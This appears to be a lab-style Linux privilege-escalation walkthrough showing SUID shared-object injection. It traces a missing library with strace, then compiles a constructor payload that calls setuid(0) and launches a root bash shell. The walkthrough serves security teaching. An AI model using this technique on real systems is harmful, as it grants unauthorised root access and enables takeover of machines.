Suppose we have a `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection on our machine.

First, execute the file and note that currently it displays a progress bar before exiting:

```bash
/usr/local/bin/suid-so
```

Run `strace` on the file and search the output for open/access calls and for "no such file" errors:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the **.config** directory for the libcalc.so file:

```bash
mkdir /home/user/.config
```

Now we inject this c code in a file and we compile it into a shared object at the location the `suid-so` was looking for.

Here is the code to compile:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

Now we compile:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

and then we execute the `sudi-so`:

```bash
/usr/local/bin/suid-so
```